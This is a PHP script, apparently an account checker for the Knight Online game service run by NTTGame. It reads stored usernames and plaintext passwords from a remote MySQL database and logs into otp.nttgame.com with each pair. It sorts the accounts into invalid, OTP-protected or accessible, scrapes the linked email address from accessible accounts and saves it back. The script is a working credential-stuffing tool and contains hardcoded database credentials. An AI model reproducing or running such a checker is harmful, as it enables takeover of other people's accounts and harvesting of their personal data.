<?php

require "class.http.php";
//set_time_limit(0);



$http = new Curl();
$http->setSsl();
$http->setAjax();
$http->setCookieFile("cookie.txt");

//$kaynak = $http->post("https://signup.live.com/API/CheckAvailableSigninNames?lcid=1033&wa=wsignin1.0&rpsnv=13&ct=1528497658&rver=6.7.6640.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26signup%3d1%26RpsCsrfState%3da04993e8-3b7e-1d8f-ba78-2462812baec7&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&uaid=9446048b06774280bd724537d161a178&lic=1", "{\"signInName\":\"denizhan5401@hotmail.com\",\"uaid\":\"9446048b06774280bd724537d161a178\",\"includeSuggestions\":true,\"uiflvr\":1001,\"scid\":100118,\"hpgid\":\"Signup_MemberNamePage_Client\",\"tcxt\":\"OTS2uBcKI68XD9oylYzCXVWjbz9Gr1HBNfd3k1FMHy08V5GWWUfGkYL1GtqWQTjHFcPTS4Q6kjBNUOf1nyKiNaYQOUlxsiBcmvC/5ijqigV5BFh/JYWicE84Xh77Lq393UzLGQY/I0PN+nevFrEJKyQ6sqcEAp9btx74kZQ0xx5oYsMwlc5rudJVgtS5bCOj8IadY/HE954+rUXjvN3I0pP7TWbw3wpCjmSt05FYeLcCVk+flW/S0rhsIrOmwmFc4r+5aYQVnRLw0rBmJb/0a2XN9+Tg2mR2vYsjP+o+ypRiu7TwDGbzGvtbLD2he8f7Jlh2ju5D5zIUUfOLJi4Gmd09lwDb2RGJCHDxHbTQHlE1L5Pcm6yw+9bNrhbPyu/Fh972Bx1k4W4TuJVl+5BGK/k73c5KcGTA9PrkJ7o4VabKj4w3NRd+Vnqv7mvI1DXiWkZ46dNzPz5eay22wZKQHZiiDAs+1Lp0ipAKnr+2FnE072ShTUQDv1hYrAEx4wqO:2:3\"}");

//echo $kaynak;



//exit;


//$con = mysql_connect("localhost", "klanlarb_ko", "12121212") or die("con error");
//mysql_select_db("klanlarb_ko") or die("no db");

$con = mysql_connect("78.135.99.150", "klanlarb_yeniko", "12121212") or die("con error");
mysql_select_db("klanlarb_yeniko") or die("no db");

mysql_query("SET NAMES utf8");

//exit;


$query = mysql_query("SELECT * FROM knight_reis WHERE giris = 'DOGRU' and email = '' ");

while ($result = mysql_fetch_array($query)) {

    print_r($result); exit;


    $http = new Curl();
    //$http->setSsl();
    $http->setCookieFile("cookie1.txt");

    $username = $result["user"];
    $password = $result["password"];

    //$kaynak = $http->post("https://otp.nttgame.com/login/login?","returnurl=%2FMyICS%2F&optGame=KO&optCompany=NTTGame&txtID=$username&txtPassword=$password");
    $kaynak = $http->post("https://otp.nttgame.com/login/login?","returnurl=%2FMyICS%2F&optGame=KO&optCompany=NTTGame&txtID=$username&txtPassword=$password");


    echo $kaynak; exit;
    $state = -1;
    $email = "OK";

    if (preg_match('#incorrect#', $kaynak, $r)) {
        $email = "YANLIS";
        $state = 0;
    }

    if (preg_match('#document\.location\.href=\'/MyICS/\'#', $kaynak, $r)) $state = 1;

    if (preg_match('#Mobile Authentication#', $kaynak, $r)) {
        $email = "OTP";
        $state = 2;
    }


    if ($state == 1) {
        $kaynak = $http->get("https://otp.nttgame.com/MyICS/sendVerificationEmail");
        $kaynak = str_replace(">", ">\n", $kaynak);
        $kaynak = str_replace("<", "\n<", $kaynak);
        //$kaynak = "ahmetugur@hotmail.com.tr";
        preg_match('/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}/', $kaynak, $x);
        // print_r($x);

        $email = $x[0];


    }




    mysql_query("UPDATE knight_reis SET email = '$email' WHERE id =  " . $result["id"]);



    echo "$username $password $email"; exit;


}


